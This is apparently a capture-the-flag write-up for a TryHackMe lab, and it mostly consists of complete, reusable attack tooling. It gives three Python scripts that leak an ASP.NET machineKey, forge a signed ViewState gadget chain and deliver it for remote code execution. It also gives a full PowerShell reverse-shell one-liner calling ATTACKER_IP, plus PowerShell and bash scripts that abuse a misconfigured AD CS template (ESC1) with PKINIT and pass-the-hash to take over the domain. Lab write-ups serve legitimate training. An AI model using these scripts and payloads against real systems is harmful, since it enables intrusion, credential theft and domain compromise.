# Rubber Stamp THM — Full Exploitation Writeup

## 1. Initial Access — ASP.NET ViewState Deserialization RCE (machineKey Leak)

### Recon

| Item | Value |
|------|-------|
| Target | `http://rubber.stamp.thm` |
| Vulnerable Page | `/legacy/RequestStatus.aspx` |
| Leak Parameter | `?id=none&debug=true` |
| Leaked validationKey | `D7D2FA8B5C1E4A9F3B6C8D0E2F4A6B8C1D3E5F7A9B1C3D5E7F9A1B3C5D7E9F1A` |
| Leaked decryptionKey | `A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4` |
| Validation Algorithm | SHA1 |
| RCE Identity | `rubberstamp\svc-iisweb` |

### How It Works

1. A legacy ASP.NET WebForms page (`/legacy/RequestStatus.aspx`) sits alongside the site's main MVC application — leftover from the original production stack.
2. The page honours an undocumented `debug=true` query parameter. Passing a non-numeric `id` alongside it causes `int.Parse` to throw, and the resulting verbose exception handler dumps the application's raw ASP.NET `machineKey` (`validationKey` / `decryptionKey`) directly into the HTTP response.
3. With both keys known, the page's `__VIEWSTATE` becomes forgeable: deriving the page-specific keys via the SP800-108 KDF (exactly as `System.Web.Security.Cryptography` does internally) allows a standard `ysoserial.net`-style `ObjectStateFormatter` gadget chain to be encrypted and HMAC-signed so it validates as legitimate.
4. POSTing the forged `__VIEWSTATE` back to the page triggers deserialization and remote code execution as the IIS application pool identity.

### Python Exploit

**Stage 1 — Leak the machineKey:**

```python
#!/usr/bin/env python3
"""
Stage 1 - Machine key leak
==========================
Rubberstamp / TryHackMe

The legacy WebForms page at /legacy/RequestStatus.aspx honours an
undocumented `debug=true` query parameter. Passing a non-numeric `id`
together with `debug=true` makes the page's exception handler dump
verbose diagnostic output instead of the normal generic error page -
including the raw ASP.NET machineKey (validationKey / decryptionKey)
compiled into the application.
"""
import argparse
import re
import sys
import requests


def leak_debug_output(base_url: str, timeout: int = 10) -> str:
    url = base_url.rstrip("/")
    if not url.lower().endswith(".aspx"):
        url += "/legacy/RequestStatus.aspx"
    params = {"id": "none", "debug": "true"}
    resp = requests.get(url, params=params, timeout=timeout)
    # A 500 here is expected: it means the verbose error handler fired.
    if resp.status_code != 200:
        print(f"[*] Got HTTP {resp.status_code} (expected) - reading body anyway")
    return resp.text


def extract_candidate_keys(debug_text: str):
    hex_candidates = re.findall(r"\b[0-9A-Fa-f]{32,160}\b", debug_text)
    seen = []
    for h in hex_candidates:
        if h not in seen:
            seen.append(h)
    return seen


def main():
    ap = argparse.ArgumentParser(description="Stage 1: leak the ASP.NET machineKey via the debug=true parameter")
    ap.add_argument("url", help="Base target URL")
    ap.add_argument("-o", "--output", default="debug_response.txt")
    args = ap.parse_args()

    print(f"[*] Requesting debug output from {args.url} ...")
    text = leak_debug_output(args.url)

    with open(args.output, "w") as f:
        f.write(text)
    print(f"[+] Raw response saved to {args.output}")

    candidates = extract_candidate_keys(text)
    if not candidates:
        print("[-] No obvious hex key material found automatically.")
        sys.exit(1)

    print(f"\n[+] Found {len(candidates)} candidate hex string(s) (longest first):")
    for h in sorted(candidates, key=len, reverse=True):
        print(f"    len={len(h):>4}  {h}")


if __name__ == "__main__":
    main()
```

**Stage 2 — Forge a malicious ViewState:**

```python
#!/usr/bin/env python3
"""
Stage 2 - Forge a malicious ViewState payload
==============================================
Rubberstamp / TryHackMe

Derives the page-specific encryption/validation keys via the SP800-108
KDF (reusing the correct implementation from the `badsecrets` library,
bundled under ./bsmin), patches a known-good ysoserial.net
ObjectStateFormatter gadget chain with an attacker-supplied command,
then encrypts (AES-CBC) and signs (HMAC-SHA1) it so it validates as a
legitimate ViewState under the leaked machineKey.
"""
import sys
import os
import base64
import hmac
import hashlib
import argparse

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "bsmin"))
from badsecrets.helpers import sp800_108_derivekey, sp800_108_get_key_derivation_parameters
from Crypto.Cipher import AES


def vlq(n: int) -> bytes:
    out = bytearray()
    while n >= 0x80:
        out.append((n & 0x7F) | 0x80)
        n >>= 7
    out.append(n & 0x7F)
    return bytes(out)


def build_command_string(args) -> str:
    if args.ps:
        enc = base64.b64encode(args.ps.encode("utf-16le")).decode()
        return "powershell -NoP -NonI -enc " + enc
    elif args.cmd:
        return args.cmd
    else:
        raise SystemExit("Provide a command via -ps or -cmd")


def patch_payload(unsigned_path: str, cmd: str) -> bytearray:
    payload = bytearray(base64.b64decode(open(unsigned_path).read().strip()))

    i = payload.find(b"/c ")
    if i < 1:
        raise SystemExit(f"could not find embedded '/c ' marker in {unsigned_path}")

    old_len = payload[i - 1]
    if old_len & 0x80:
        raise SystemExit("unexpected multi-byte VLQ length - gadget format mismatch")

    newseq = vlq(len(cmd) + 3) + b"/c " + cmd.encode()
    payload[i - 1 : i + old_len] = newseq

    data_start = 3 + len(vlq(len(payload) - 3))
    enc_len = vlq(len(payload) - data_start)
    if 3 + len(enc_len) != data_start:
        raise SystemExit("VLQ size drift after patch")
    payload[3 : 3 + len(enc_len)] = enc_len

    return payload


def encrypt_and_sign(payload: bytearray, dekey: bytes, dvkey: bytes) -> bytes:
    pt = bytes(payload)
    padlen = 16 - (len(pt) % 16)
    pt += bytes([padlen]) * padlen

    iv = os.urandom(16)
    ct = AES.new(dekey, AES.MODE_CBC, iv).encrypt(pt)
    blob = iv + ct
    sig = hmac.new(dvkey, blob, hashlib.sha1).digest()
    return base64.b64encode(blob + sig)


def main():
    ap = argparse.ArgumentParser(description="Stage 2: forge a malicious ViewState payload")
    ap.add_argument("--vkey", required=True)
    ap.add_argument("--ekey", required=True)
    ap.add_argument("--page-path", default="/LEGACY")
    ap.add_argument("--page-type", default="LEGACY_REQUESTSTATUS_ASPX")
    ap.add_argument("--unsigned", default="unsigned.txt")
    ap.add_argument("--out", default="forged_vs.b64")
    ap.add_argument("-ps", help="PowerShell command (auto base64/UTF-16LE wrapped)")
    ap.add_argument("-cmd", help="Raw cmd.exe command")
    args = ap.parse_args()

    VKEY = bytes.fromhex(args.vkey)
    EKEY = bytes.fromhex(args.ekey)

    lbl, ctx = sp800_108_get_key_derivation_parameters(
        "WebForms.HiddenFieldPageStatePersister.ClientState",
        [f"TemplateSourceDirectory: {args.page_path}", f"Type: {args.page_type}"],
    )
    dekey = sp800_108_derivekey(EKEY, lbl, ctx, len(EKEY) * 8)
    dvkey = sp800_108_derivekey(VKEY, lbl, ctx, len(VKEY) * 8)

    cmd = build_command_string(args)
    print(f"[*] Embedding command ({len(cmd)} chars)")

    payload = patch_payload(args.unsigned, cmd)
    forged = encrypt_and_sign(payload, dekey, dvkey)

    with open(args.out, "wb") as f:
        f.write(forged)

    print(f"[+] Forged ViewState written to {args.out}")


if __name__ == "__main__":
    main()
```

**Stage 3 — Deliver the payload:**

```python
#!/usr/bin/env python3
"""
Stage 3 - Deliver the forged ViewState
=======================================
Rubberstamp / TryHackMe

POSTs the forged __VIEWSTATE back to the vulnerable page. The gadget
chain fires during deserialization, running the embedded command as
the IIS app pool identity (svc-iisweb).
"""
import argparse
import requests


def send(url: str, viewstate_path: str, generator: str, id_param: str, timeout: int):
    with open(viewstate_path, "rb") as f:
        viewstate_b64 = f.read().decode().strip()

    data = {
        "__VIEWSTATE": viewstate_b64,
        "__VIEWSTATEGENERATOR": generator,
    }
    params = {"id": id_param}

    resp = requests.post(url, params=params, data=data, timeout=timeout)
    return resp


def main():
    ap = argparse.ArgumentParser(description="Stage 3: deliver the forged ViewState to trigger deserialization RCE")
    ap.add_argument("url")
    ap.add_argument("--viewstate", default="forged_vs.b64")
    ap.add_argument("--generator", required=True)
    ap.add_argument("--id", default="1")
    ap.add_argument("--timeout", type=int, default=15)
    args = ap.parse_args()

    print(f"[*] Sending forged ViewState to {args.url}?id={args.id}")
    resp = send(args.url, args.viewstate, args.generator, args.id, args.timeout)

    print(f"[+] Response status: {resp.status_code}")
    print(resp.text[:500])


if __name__ == "__main__":
    main()
```

### Usage

```bash
# Stage 1: leak the machineKey
python3 01_leak_key.py http://rubber.stamp.thm
# -> validationKey / decryptionKey recovered from debug_response.txt

# Stage 2: forge a reverse-shell ViewState (start a listener first: nc -lvnp 4444)
python3 02_forge_viewstate.py \
  --vkey D7D2FA8B5C1E4A9F3B6C8D0E2F4A6B8C1D3E5F7A9B1C3D5E7F9A1B3C5D7E9F1A \
  --ekey A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4 \
  -ps '$c=New-Object Net.Sockets.TCPClient("ATTACKER_IP",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+"PS "+(pwd).Path+"> ");$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()'

# Stage 3: fetch the current generator value and deliver the payload
curl -s "http://rubber.stamp.thm/legacy/RequestStatus.aspx?id=1" | grep -oP '(?<=GENERATOR" id="__VIEWSTATEGENERATOR" value=")[^"]*'
python3 03_send_payload.py http://rubber.stamp.thm/legacy/RequestStatus.aspx --generator 0CA456E0
```

The HTTP response comes back as `500 Internal Server Error` — this is expected: the gadget chain executes as a side effect of deserialization, before the page can finish rendering normally. A connection lands on the listener as:

```
rubberstamp\svc-iisweb
SRV01
```

### User Flag

```bash
type C:\Users\Public\user.txt
```

```
THM{m4ch1n3k3y_l34k_2_v13wst4t3_rc3}
```

---

## 2. Privilege Escalation: `svc-iisweb` → `Administrator` (ADCS ESC1)

### How It Works

1. `whoami /priv` as `svc-iisweb` shows no `SeImpersonate`, `SeAssignPrimaryToken`, `SeDebug`, `SeBackup`/`SeRestore`, or `SeTakeOwnership` — local privilege escalation is not viable.
2. AD enumeration (`Get-ADUser`, `Get-ADGroupMember "Domain Admins"`) shows only the built-in `Administrator` has Domain Admin rights, and `svc-iisweb` has no exploitable group memberships or SPNs — standard AD attack paths are dead ends.
3. `svc-iisweb`'s group membership includes `Certificate Service DCOM Access`, pointing toward Active Directory Certificate Services (ADCS).
4. Inspecting the CA's `PrivClientAuth` certificate template reveals the classic **ESC1** misconfiguration:
   - `msPKI-Certificate-Name-Flag = 1` → `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (requester controls the SAN)
   - `msPKI-Enrollment-Flag = 9` → no `CT_FLAG_PEND_ALL_REQUESTS` (no manager approval)
   - `msPKI-RA-Signature = 0` (no co-signer required)
   - `pKIExtendedKeyUsage` includes Client Authentication (usable for PKINIT)
   - `Domain Users` are permitted to enroll
5. Because `svc-iisweb` is a domain user, it can request a certificate from this template while supplying its own SAN of `administrator@rubberstamp.local`. The CA issues it without question.
6. That certificate is then used to **PKINIT**-authenticate as Administrator via `certipy`, recovering the Administrator NT hash for pass-the-hash.

### PowerShell Exploit (Certificate Enrollment)

```powershell
<#
Stage 4 - ADCS ESC1 exploitation
Rubberstamp / TryHackMe

Run ON the compromised host (as svc-iisweb). Submits a CSR with SAN
administrator@rubberstamp.local to the vulnerable PrivClientAuth
template via CA web enrollment, authenticated with the current
Windows session (Negotiate/NTLM).
#>

param(
    [string]$CA = "SRV01.rubberstamp.local\rubberstamp-SRV01-CA",
    [string]$CertSrvHost = "SRV01.rubberstamp.local",
    [string]$Template = "PrivClientAuth",
    [string]$OutDir = "C:\badr",
    [string]$CsrBase64 = ""
)

if (-not (Test-Path $OutDir)) {
    New-Item -ItemType Directory -Path $OutDir | Out-Null
}

if ([string]::IsNullOrWhiteSpace($CsrBase64)) {
    Write-Host "[-] No CSR provided. Generate esc1.key/esc1.csr attacker-side and pass the base64 DER CSR via -CsrBase64." -ForegroundColor Yellow
    exit 1
}

Write-Host "[*] Confirming CA is reachable and template exists ..."
certutil -config $CA -CATemplates | Select-String $Template

$postData = @{
    Mode             = "newreq"
    CertRequest      = $CsrBase64
    CertAttrib       = "CertificateTemplate:$Template"
    TargetStoreFlags = "0"
    SaveCert         = "no"
}

Write-Host "[*] Submitting enrollment request to $CertSrvHost as current user ($(whoami)) ..."
$requestData = Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing `
    -Uri "http://$CertSrvHost/certsrv/certfnsh.asp" `
    -Method Post -Body $postData -TimeoutSec 20

$req = [regex]::Match($requestData.Content, 'ReqID=(\d+)').Groups[1].Value
if (-not $req) {
    Write-Host "[-] Could not find a ReqID - enrollment likely failed or was queued for approval." -ForegroundColor Red
    exit 1
}
Write-Host "[+] Certificate request ID: $req"

$certPath = Join-Path $OutDir "admin_cert.pem"
Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing `
    -Uri "http://$CertSrvHost/certsrv/certnew.cer?ReqID=$req&Enc=b64" `
    -OutFile $certPath -TimeoutSec 20

Write-Host "[+] Certificate saved at $certPath"
Get-Content -Raw $certPath
```

### Bash Exploit (PKINIT + Pass-the-Hash)

```bash
#!/usr/bin/env bash
#
# Stage 5 - PKINIT to Domain Admin, read the flags
# =================================================
# Rubberstamp / TryHackMe
#
# Packages esc1.key + admin_cert.pem into a PFX, authenticates via
# PKINIT with certipy to recover the Administrator NT hash, then uses
# that hash for pass-the-hash (nxc) to read both flags.
#
# Usage: ./05_pkinit_domainadmin.sh <DC_IP> <DOMAIN>

set -euo pipefail

DC_IP="${1:?Usage: $0 <DC_IP> <DOMAIN>}"
DOMAIN="${2:?Usage: $0 <DC_IP> <DOMAIN>}"

KEY_FILE="esc1.key"
CERT_FILE="admin_cert.pem"
PFX_FILE="admin.pfx"
PFX_PASS="pass"

for f in "$KEY_FILE" "$CERT_FILE"; do
    if [[ ! -f "$f" ]]; then
        echo "[-] Missing required file: $f" >&2
        exit 1
    fi
done

echo "[*] Packaging key + certificate into PKCS#12 bundle ($PFX_FILE) ..."
openssl pkcs12 -export \
    -inkey "$KEY_FILE" \
    -in "$CERT_FILE" \
    -out "$PFX_FILE" \
    -passout "pass:$PFX_PASS"

echo "[*] Sanity check: key and certificate modulus hashes should match"
CERT_MOD=$(openssl x509 -in "$CERT_FILE" -noout -modulus | openssl md5)
KEY_MOD=$(openssl rsa -in "$KEY_FILE" -noout -modulus | openssl md5)
if [[ "$CERT_MOD" != "$KEY_MOD" ]]; then
    echo "[-] Modulus mismatch - wrong key/cert pair." >&2
    exit 1
fi
echo "[+] Modulus match confirmed."

echo "[*] Authenticating via PKINIT as administrator ..."
certipy auth \
    -pfx "$PFX_FILE" \
    -password "$PFX_PASS" \
    -username administrator \
    -domain "$DOMAIN" \
    -dc-ip "$DC_IP"

echo
read -rp "Administrator NT hash: " NT_HASH

echo "[*] Reading user.txt and root.txt via nxc ..."
nxc smb "$DC_IP" -u Administrator -H "$NT_HASH" \
    -x 'type C:\Users\Public\user.txt'

nxc smb "$DC_IP" -u Administrator -H "$NT_HASH" \
    -x 'type C:\Users\Administrator\Desktop\root.txt'
```

### Usage

```bash
# Attacker box - generate the CSR with the forged SAN
cat > esc1.cnf << 'EOF'
[req]
distinguished_name=dn
req_extensions=ext
prompt=no

[dn]
CN=Administrator

[ext]
subjectAltName=@alt

[alt]
otherName.1=1.3.6.1.4.1.311.20.2.3;UTF8:administrator@rubberstamp.local
DNS.1=administrator.rubberstamp.local
EOF

openssl req -new -newkey rsa:2048 -nodes -keyout esc1.key -out esc1.csr -config esc1.cnf
openssl req -in esc1.csr -outform DER | base64 -w0
```

```powershell
# On the compromised host (RCE shell as svc-iisweb)
.\04_esc1_enroll.ps1 -CsrBase64 "<base64 DER CSR>"
# -> retrieves admin_cert.pem; copy it back to the attacker box
```

```bash
# Attacker box - PKINIT and read both flags
pip install certipy-ad --break-system-packages
chmod +x 05_pkinit_domainadmin.sh
./05_pkinit_domainadmin.sh <DC_IP> rubberstamp.local
```

### Root Flag

```bash
nxc smb <DC_IP> -u Administrator -H <NT_HASH> -x 'type C:\Users\Administrator\Desktop\root.txt'
```

```
THM{3sc1_c3rt_sp00f_2_d0m41n_4dm1n}
```

---

## Summary

| Stage | CVE / Method | Result |
|-------|-------------|--------|
| Initial Access | ASP.NET ViewState deserialization RCE, enabled by a `debug=true` machineKey leak | Shell as `rubberstamp\svc-iisweb` |
| PrivEsc | ADCS ESC1 — misconfigured `PrivClientAuth` certificate template + PKINIT | `Administrator` (Domain Admin) |
